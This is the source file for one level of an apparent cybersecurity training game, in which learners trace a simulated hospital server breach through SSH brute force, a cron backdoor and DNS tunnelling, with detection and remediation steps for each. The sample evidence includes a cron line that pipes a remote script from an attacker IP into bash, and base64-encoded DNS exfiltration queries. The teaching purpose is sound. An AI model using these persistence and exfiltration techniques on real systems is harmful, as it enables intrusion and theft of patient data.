// src/screens/cyber-security/stage2/CY2_Level12.jsx — Intrusion Investigation (DEBUG)
// A real hospital server has been breached. Read the logs, find the attack.
import { useState } from 'react';
import CY2Shell from './CY2Shell';

const BUGS = [
  {
    id: 1,
    label: 'Finding 1 — Initial Access via SSH Brute Force',
    bad:
`# /var/log/auth.log extract — 03:47 UTC
Failed password for root from 185.220.101.42 port 49812 ssh2
Failed password for root from 185.220.101.42 port 49813 ssh2
Failed password for root from 185.220.101.42 port 49814 ssh2
...repeated 847 times in 4 minutes...
Accepted password for root from 185.220.101.42 port 49815 ssh2
# root logged in successfully at 03:51 UTC`,
    good:
`# Detection: grep "Accepted password" /var/log/auth.log
# Shows 185.220.101.42 succeeded after 847 failures
# This is Tor exit node 185.220.101.42 — attacker used Tor

# Response:
# 1. Block 185.220.101.42 immediately: ufw deny from 185.220.101.42
# 2. Disable root SSH login: PermitRootLogin no in /etc/ssh/sshd_config
# 3. Require key-based auth: PasswordAuthentication no
# 4. Rotate all root credentials
# 5. Preserve logs before any remediation`,
    why: 'SSH brute force is automated — attackers run tools like Hydra against port 22. The tell: hundreds of failures in seconds from one IP, then one success. Root login via password is the critical misconfiguration that made this possible. Standard hardening: disable root SSH, require key auth, rate-limit with fail2ban.',
    hint: 'Brute force signature: many failures from one IP, then acceptance. Root + password = misconfiguration.',
    wrong_category: 'state',
    wrong_direction: 'The SSH service is not the problem — look at the authentication log pattern. Count the failures before the success and note which account was targeted.',
    wrong_hint: 'grep "Failed password" auth.log | wc -l — then grep "Accepted password" to find when they got in.',
  },
  {
    id: 2,
    label: 'Finding 2 — Persistence via Cron Backdoor',
    bad:
`# /var/spool/cron/crontabs/root — modified at 03:54 UTC
# (3 minutes after initial access)
*/5 * * * * curl -s http://185.220.101.42:8080/payload.sh | bash
# Runs every 5 minutes — downloads and executes a remote script
# Even if the attacker loses their SSH session, this re-establishes access`,
    good:
`# Detection:
crontab -l -u root
# Shows the malicious cron entry

# Also check:
ls -la /var/spool/cron/crontabs/
cat /etc/cron.d/*
cat /etc/crontab

# Removal:
crontab -r -u root          # Wipe all root crons (verify first)
# Or edit: crontab -e -u root

# Block the C2 server:
ufw deny out to 185.220.101.42`,
    why: 'Persistence is the second step in every intrusion. Attackers establish it within minutes of gaining access — they know the SSH session can drop. A cron job calling back to a C2 server is one of the most common persistence mechanisms because cron runs as root, survives reboots, and is not monitored by most teams.',
    hint: 'Check crontab -l immediately after any breach. Persistence is installed within minutes.',
    wrong_category: 'logic',
    wrong_direction: 'The cron service itself is fine — the issue is in the content of the root crontab file. Look at what command is scheduled and where it fetches from.',
    wrong_hint: 'A cron entry with curl piped to bash is a remote code execution backdoor. The attacker can change the payload at any time.',
  },
  {
    id: 3,
    label: 'Finding 3 — Data Exfiltration via DNS Tunnelling',
    bad:
`# Unusual DNS queries detected in /var/log/syslog — 04:10–04:47 UTC
query: aGVhbHRoX3JlY29yZHNf.exfil.attacker.io
query: dXNlcl9pZD0xMjM0NV9u.exfil.attacker.io
query: YW1lPUpvaG5Eb2VfZG9i.exfil.attacker.io
# Base64 encoded patient data in DNS subdomain labels
# Each label = 63 chars max. Multiple queries = chunked data stream.
# DNS traffic typically allowed outbound — bypasses most firewalls`,
    good:
`# Detection:
# DNS queries with long random-looking subdomains to same domain
# High query volume to one external domain
# Subdomains that look like base64 (A-Z, a-z, 0-9, +, /)

# Decode a sample:
echo "aGVhbHRoX3JlY29yZHNf" | base64 -d
# → health_records_  (confirms patient data exfiltration)

# Block:
# 1. Block all DNS to attacker.io: unbound-control local_zone "attacker.io" refuse
# 2. Force all DNS through internal resolver — block port 53 outbound except to your DNS
# 3. Monitor DNS logs with dnstop or Pi-hole for anomalous patterns`,
    why: 'DNS tunnelling exploits the fact that DNS traffic is almost never blocked outbound. Attackers encode data in subdomain labels (base64), make many DNS queries, and reconstruct the data server-side. Patient records can be exfiltrated slowly over hours without triggering data-loss prevention tools that only watch HTTP/HTTPS.',
    hint: 'DNS tunnelling: base64-looking subdomains, high query volume to one domain. Decode a sample to confirm.',
    wrong_category: 'concept',
    wrong_direction: 'The DNS service is working correctly — it is resolving the queries as designed. The problem is in what is being encoded in the subdomain labels. Decode one.',
    wrong_hint: 'echo "aGVhbHRoX3JlY29yZHNf" | base64 -d — if it reads like data, it is data.',
  },
];

export default function CY2_Level12() {
  const [found, setFound] = useState(new Set());
  const allDone = found.size >= BUGS.length;

  return (
    <CY2Shell levelId={12} canProceed={allDone}
      prevLevelContext="In the last level you analysed system logs for anomalies. Now you will investigate a real intrusion from start to finish — initial access, persistence, and data exfiltration."
      cumulativeSkills={[
        'Navigated a Linux server: filesystem, users, processes, permissions',
        'Written shell commands for forensic investigation: find, grep, netstat, ps',
        'Identified misconfigured file permissions that create privilege escalation paths',
        'Monitored network traffic with netstat and ss to detect active connections',
        'Used tcpdump and Wireshark concepts to analyse packet captures',
        'Queried firewall rules and identified gaps that allow lateral movement',
        'Scanned for open ports and understood the attack surface each creates',
        'Used SSH hardening: key auth, PermitRootLogin no, fail2ban',
        'Analysed network tool output to identify port scans and enumeration',
        'Read packet captures to identify exfiltration and C2 traffic',
        'Parsed auth.log, syslog, and application logs for attack indicators',
        'Investigated a complete intrusion: SSH brute force, cron backdoor, DNS exfiltration',
      ]}
      conceptReveal={[
        { label: 'The Intrusion Kill Chain', detail: 'Every intrusion follows the same arc: Reconnaissance → Initial Access → Persistence → Privilege Escalation → Lateral Movement → Exfiltration. This investigation covered Initial Access (SSH brute force), Persistence (cron backdoor), and Exfiltration (DNS tunnelling). Knowing the kill chain tells you what to look for after you find any single step.' },
        { label: 'DNS Tunnelling', detail: 'DNS is almost never blocked outbound — attackers know this. Base64 data encoded in subdomain labels leaves the network as perfectly normal-looking DNS queries. Detection requires DNS log monitoring with anomaly detection. Pi-hole, Zeek, or commercial SIEM rules can flag high-volume queries to a single domain with random-looking subdomains.' },
      ]}
    >
      <div className="cy2-intro">
        <h1>Intrusion Investigation</h1>
        <p className="cy2-tagline">🔍 A hospital server was breached at 03:47 UTC. Investigate the full attack chain.</p>
        <p className="cy2-why">Real incident response is log reading. Three things happened to this server in 60 minutes: initial access, persistence installation, and data exfiltration. Each left evidence. Find it, understand it, and know how to stop it from happening again.</p>
      </div>

      <div style={{ display:'flex', flexDirection:'column', gap:14 }}>
        {BUGS.map(bug => {
          const isSolved = found.has(bug.id);
          return (
            <div key={bug.id} style={{
              background:'#1e293b', borderRadius:10, padding:'16px 20px',
              border:`1px solid ${isSolved ? '#4ade8060' : '#334155'}`,
              borderLeft:`3px solid ${isSolved ? '#4ade80' : '#f87171'}`,
            }}>
              <h3 style={{ color: isSolved ? '#4ade80' : '#f87171', margin:'0 0 10px', fontSize:14 }}>
                {bug.label}
              </h3>
              <div className="cy2-panel" style={{ margin:'0 0 8px' }}>
                <div className="cy2-panel-hdr" style={{ color:'#f87171' }}>📋 Log evidence</div>
                <pre className="cy2-panel-body" style={{ margin:0, overflowX:'auto', fontSize:12, color:'#cbd5e1', whiteSpace:'pre-wrap' }}>
                  {bug.bad}
                </pre>
              </div>
              <p style={{ color:'#64748b', fontSize:13, margin:'8px 0' }}>💡 {bug.hint}</p>
              {!isSolved ? (
                <button className="cy2-check-btn"
                  style={{ background:'#334155', color:'#94a3b8', fontSize:13, padding:'7px 16px' }}
                  onClick={() => setFound(prev => { const n=new Set(prev); n.add(bug.id); return n; })}>
                  Show Investigation & Fix
                </button>
              ) : (
                <>
                  <div className="cy2-panel" style={{ margin:'8px 0 6px' }}>
                    <div className="cy2-panel-hdr" style={{ color:'#4ade80' }}>✅ Investigation & remediation</div>
                    <pre className="cy2-panel-body" style={{ margin:0, overflowX:'auto', fontSize:12, color:'#94a3b8', whiteSpace:'pre-wrap' }}>
                      {bug.good}
                    </pre>
                  </div>
                  <p style={{ color:'#94a3b8', fontSize:13, lineHeight:1.6, margin:'6px 0' }}>{bug.why}</p>
                </>
              )}
            </div>
          );
        })}
      </div>
      {allDone && (
        <div className="cy2-feedback success" style={{ marginTop:20 }}>
          ✅ Full intrusion chain investigated. You can read an attack from logs alone.
        </div>
      )}
    </CY2Shell>
  );
}
